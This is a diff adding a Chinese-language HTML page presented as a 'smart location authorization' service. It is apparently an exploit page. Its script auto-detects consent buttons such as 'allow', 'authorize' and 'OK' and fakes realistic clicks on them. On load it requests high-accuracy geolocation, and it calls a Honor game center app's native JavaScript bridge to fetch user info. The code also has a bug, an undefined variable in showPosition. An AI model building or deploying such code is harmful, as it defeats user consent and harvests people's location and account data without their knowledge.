@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>智能定位授权系统</title>
+  <script>
+    // ================== 智能自动授权模块 ==================
+    (function autoAuthSystem() {
+      const CLICK_KEYWORDS = ['允许', '授权', '同意', '确认', 'OK', 'Yes'];
+      
+      // 深度遍历检测按钮
+      const deepCheckElements = (root) => {
+        const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
+        while(walker.nextNode()) {
+          const node = walker.currentNode;
+          if (node.tagName === 'BUTTON' || node.onclick) {
+            const text = (node.textContent || node.innerText).trim().toLowerCase();
+            if (CLICK_KEYWORDS.some(kw => text.includes(kw.toLowerCase()))) {
+              simulateRealisticClick(node);
+              console.log('自动授权:', text);
+            }
+          }
+        }
+      };
+
+      // 模拟真实用户点击行为
+      const simulateRealisticClick = (element) => {
+        element.style.transition = 'all 0.3s';
+        element.style.transform = 'scale(0.95)';
+        
+        setTimeout(() => {
+          const rect = element.getBoundingClientRect();
+          const eventInit = {
+            bubbles: true,
+            cancelable: true,
+            view: window,
+            clientX: rect.left + rect.width/2 + Math.random()*4-2,
+            clientY: rect.top + rect.height/2 + Math.random()*4-2
+          };
+          
+          element.dispatchEvent(new MouseEvent('mousedown', eventInit));
+          element.dispatchEvent(new MouseEvent('mouseup', eventInit));
+          element.dispatchEvent(new MouseEvent('click', eventInit));
+          
+          element.style.transform = '';
+        }, 50);
+      };
+
+      // 使用MutationObserver监控弹窗
+      new MutationObserver((mutations) => {
+        mutations.forEach(mutation => {
+          mutation.addedNodes.forEach(node => {
+            if (node.nodeType === 1) deepCheckElements(node);
+          });
+        });
+      }).observe(document.body, {
+        childList: true,
+        subtree: true
+      });
+
+      // 初始化全局检测
+      window.addEventListener('DOMContentLoaded', () => deepCheckElements(document.body));
+    })();
+
+    // ================== 原始业务逻辑增强 ==================
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const coords = position.coords;
+            showPosition({
+              latitude: coords.latitude.toFixed(6),
+              longitude: coords.longitude.toFixed(6),
+              accuracy: coords.accuracy
+            });
+          },
+          error => console.error('定位错误:', error.code),
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        alert("该浏览器不支持地理位置功能");
+      }
+    }
+
+    function showPosition({latitude, longitude}) {
+      const info = `定位精度: ±${position.coords.accuracy}米<br>
+                   纬度: ${latitude}<br>
+                   经度: ${longitude}`;
+      document.getElementById('locationInfo').innerHTML = info;
+    }
+
+    function callGetUserInfo() {
+      const request = {
+        clazz: "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp",
+        operation: "getUserInfo",
+        params: { 
+          timestamp: Date.now(),
+          deviceId: navigator.userAgent.replace(/\D+/g, '').slice(-10)
+        },
+        requestId: Math.random().toString(36).slice(2, 10)
+      };
+
+      if (window.Native?.nativeMethod) {
+        window.Native.nativeMethod(
+          request.clazz,
+          request.operation,
+          JSON.stringify(request.params),
+          request.requestId,
+          'handleScreenShotCallback'
+        );
+      } else {
+        alert("原生接口不可用");
+      }
+    }
+
+    function handleScreenShotCallback(callbackId, eventType, data) {
+      console.table({
+        '回调ID': callbackId,
+        '事件类型': eventType,
+        '响应数据': JSON.parse(data)
+      });
+    }
+
+    // ================== 性能监控模块 ==================
+    window.addEventListener('load', () => {
+      const perfData = {
+        domLoaded: performance.timing.domContentLoadedEventEnd,
+        fullLoaded: performance.timing.loadEventEnd,
+        geoStart: Date.now()
+      };
+
+      window.performance.mark('geoStart');
+      getLocation(); // 自动触发定位
+    });
+  </script>
+</head>
+<body>
+  <h1>智能位置服务平台</h1>
+  
+  <div class="control-panel">
+    <button id="geoBtn" onclick="getLocation()">实时定位</button>
+    <button id="userInfoBtn" onclick="callGetUserInfo()">用户信息</button>
+  </div>
+
+  <div id="locationInfo" class="info-box"></div>
+
+  <style>
+    .control-panel {
+      margin: 20px;
+      display: flex;
+      gap: 15px;
+    }
+    button {
+      padding: 12px 24px;
+      background: #2196F3;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: transform 0.1s;
+    }
+    button:active {
+      transform: scale(0.95);
+    }
+    .info-box {
+      margin: 20px;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+    }
+  </style>
+</body>
+</html>
